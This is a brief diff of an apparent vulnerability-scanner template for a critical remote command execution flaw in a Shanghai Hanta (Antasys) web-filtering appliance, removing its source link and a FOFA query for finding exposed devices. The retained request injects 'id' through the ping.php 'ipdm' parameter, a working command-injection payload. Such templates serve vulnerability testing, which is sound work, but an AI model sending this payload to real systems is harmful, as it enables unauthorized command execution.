@@ -3,12 +3,8 @@ info:
   name: 上海汉塔网络科技有限公司上网行为管理系统存在远程命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tsz4agaeai1wedgs'
+  description: ''
   tags: rce,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: tsz4agaeai1wedgs
-    fofa: body="Antasys"
 http:
 - raw:
   - 'GET /dgn/dgn_tools/ping.php?ipdm=127.0.0.1;id;&ps=64&cnt=1 HTTP/1.1
